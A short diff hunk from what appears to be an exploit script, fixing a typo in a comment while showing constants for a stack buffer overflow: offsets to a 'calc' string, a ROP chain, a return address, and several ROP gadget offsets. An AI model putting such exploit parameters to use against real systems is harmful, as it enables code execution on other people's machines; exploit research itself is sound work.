@@ -24,7 +24,7 @@ OFFS_CALC = 0x60 # offset to "calc\0" in buffer
 OFFS_ROPCHAIN = 0x68 # offset of ropchain in buffer
 OFFS_RET_ADDR = 0x298 # offset of return address on the stack to caller
 
-# gadgets, reative to text segment
+# gadgets, reLative to text segment
 OFFS_MOV_RSP_R11_POP_RDX = 0x66a1
 OFFS_POP_RBX = 0x6f9
 OFFS_POP_RAX = 0x167
